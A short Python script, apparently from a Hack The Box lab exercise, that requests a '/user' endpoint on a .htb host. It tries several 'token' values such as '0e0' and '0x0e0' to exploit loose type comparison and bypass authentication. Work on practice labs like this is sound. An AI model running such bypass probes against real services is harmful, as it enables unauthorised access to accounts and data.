import os
import requests

host='http://cacti.monitorsfour.htb/user'


response = requests.get(host)

print(response.text)

tokens = [
    '0', '0e0', '0x0a', '10', '20', '0x0e0'
]

for t in tokens:
    print(f"Trying token: {t}")
    response = requests.get(host, params={'token': t})
    print(response.text)
